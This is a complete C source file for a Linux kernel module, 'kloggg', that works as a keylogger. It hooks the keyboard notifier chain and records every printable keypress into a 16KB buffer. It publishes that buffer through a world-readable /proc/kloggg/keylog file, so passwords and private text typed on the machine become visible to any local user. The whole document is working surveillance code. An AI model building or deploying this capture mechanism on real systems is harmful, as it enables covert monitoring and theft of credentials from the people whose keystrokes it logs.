#include <linux/init.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include "kloggg-keymap.h" /* produced by output of "loadkeys --mktable" */

MODULE_AUTHOR("Nicholas Hubbard");
MODULE_LICENSE("GPL");

#define KEYBUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */

static char keybuf[KEYBUF_LEN];
static unsigned int keybuf_pos = 0;

/* proc_fs */
static struct proc_dir_entry *kloggg_proc_dir;
static struct proc_dir_entry *kloggg_proc_file;

static ssize_t kloggg_proc_file_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
  ssize_t len;
  size_t datalen = strnlen(keybuf, KEYBUF_LEN); // or your known data length

  if (*ppos >= datalen)
    return 0;

  len = min((size_t)(datalen - *ppos), (size_t)count);

  if (copy_to_user(ubuf, keybuf + *ppos, len))
    return -EFAULT;

  *ppos += len;
  return len;
}

static ssize_t kloggg_proc_file_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) {
  return 0; /* no writing allowed */
}

static struct proc_ops kloggg_fops = {
  .proc_read = kloggg_proc_file_read,
  .proc_write = kloggg_proc_file_write
};


static char kloggg_keycode_to_ascii(unsigned int keycode, int shift_mask) {
  u_short symbol;
  char c;

  if (keycode >= NR_KEYS)
    return '\0'; // Invalid keycode

  if (shift_mask & (1 << KG_SHIFT)) {
    symbol = shift_map[keycode];
  } else {
    symbol = plain_map[keycode];
  }

  c = symbol & 0xFF;

  // Only return if it's printable ASCII
  if (c >= 32 && c <= 126)
    return c;

  if (c == '\n' || c == '\t' || c == '\r')
    return c;

  return '\0'; // Non-ASCII or control
}

static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
  struct keyboard_notifier_param *param = data;

  if (action == KBD_KEYCODE && param->down) {
    unsigned int keycode = param->value;
    int shift_mask = param->shift;

    char c = kloggg_keycode_to_ascii(keycode, shift_mask);
    if (c > 0 && c < 128) {
      keybuf[keybuf_pos++] = c;
      if (keybuf_pos >= KEYBUF_LEN) {
        int half = KEYBUF_LEN / 2;
        for (keybuf_pos= 0; keybuf_pos < half; keybuf_pos++) {
          keybuf[keybuf_pos] = keybuf[keybuf_pos + half];
        }
      }
    }
  }

  return NOTIFY_OK;
}

static struct notifier_block kloggg_nb = {
  .notifier_call = kloggg_log
};

/* Module initialization */
static int __init kloggg_init(void) {
  kloggg_proc_dir = proc_mkdir("kloggg", NULL);
  kloggg_proc_file = proc_create("keylog", 0644, kloggg_proc_dir, &kloggg_fops);
  register_keyboard_notifier(&kloggg_nb);
  return 0;
}

/* Module cleanup */
static void __exit kloggg_exit(void) {
  proc_remove(kloggg_proc_file);
  proc_remove(kloggg_proc_dir);
  unregister_keyboard_notifier(&kloggg_nb);
}

module_init(kloggg_init);
module_exit(kloggg_exit);
